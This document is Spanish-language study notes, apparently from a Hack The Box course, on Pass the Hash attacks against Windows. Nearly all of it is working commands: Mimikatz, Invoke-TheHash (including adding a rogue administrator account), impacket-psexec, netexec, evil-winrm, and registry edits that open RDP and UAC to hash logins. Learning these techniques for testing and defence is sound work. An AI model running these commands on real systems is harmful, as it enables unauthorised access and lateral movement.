# Pass the Hash (PtH)

El ataque Pass the Hash (PtH) es una técnica en la que un atacante utiliza un hash de contraseña en lugar de la contraseña en texto plano para la autenticación. Lo bueno es que no se necesita descifrar el hash ya que este ataque lo que explota es el protocolo de autenticación ya que el hash es estático a menos que se cambie la contraseña.


## Ataques PtH en local
Es decir, los ataques se realizan directamente desde la propia maquina comprometida.
##### Mimikatz
Con el modulo sekurlsa::pth
* /user es el usuario que queremos suplantar
* /rc4 o /NTLM (cualquiera sive para especificar el hash)
```bash
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

##### Invoke-TheHash
https://github.com/Kevin-Robertson/Invoke-TheHash

```powershell
# Posicionarse
cd C:\tools\Invoke-TheHash\
# Importar el modulo
Import-Module .\Invoke-TheHash.psd1

# Ejecutar la herramienta. En este caso el comando de ejemplo crea un usuario y lo mete en el grupo de administradores
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

Este repositorio tiene herramientas como:
```
- Invoke-WMIExec
- Invoke-SMBExec
- Invoke-SMBEnum
- Invoke-SMBClient
- Invoke-TheHash
```

Que pueden ser utiliadas para, desde la maquina windows, enumerar y conectrse a recursos SMB, o ejecutar comandos.
> En el ejemplo del path Pentester de HTB, se accede a una maquina, y te invitan a conectarte al recurso compartido del DC01 (otra maquina), hay que localizar al DC01 (es nuestro servidor DNS, se ve con ipconfig /all) y luego usar Invoke-SMBClient para conectarnos al recurso compartido.

>Mirar la sintaxis en el repositorio.

```powershell
# Ejecutar comandos en un equipo de dominio utilizando usuario y hash de dominio
cd C:\tools\Invoke-TheHash\
# Importar el modulo
Import-Module .\Invoke-WMIExec.ps1
# Lanzar el comando remoto
Invoke-WMIExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command "whoami"
```



## Ataque PtH remoto

##### Impacket PsExec
```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
Además de psexec, se pueden utilizar las siguientes herramientas combinadas con el hash para aprovecharnos del pass the hash:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
##### netexec
```bash
# Esto enumera SMB utilizando el hash del administrador
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```bash
# Ejecutar comandos aprovechando el hash del administrador
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

##### Evil-winrm
```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

##### RDP
habilitar el modo de administracion restringida, teniendo acceso y privilegios en la maquina victima. Esto lo haremos si hay alguna politica que de alguna manera nos restringe el acceso por RDP mediante hash. (por defecto viene habilitado asi que de seguro nos tocará editar el registro previamente)
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp3  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

> UAC tiene limitado el Pass The Hash para cuentas locales. Hay una clave de registro que está a 0 y debemos cambiar a 1. y es esta: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`

> Además hay que tener en cuenta. Por defecto la clave de registro: `FilterAdministratorToken` viene a 0. Pero si alguien la habilita, estso imposibilitará el Pass The Hash

> Para equipos de dominio esto no es un problema
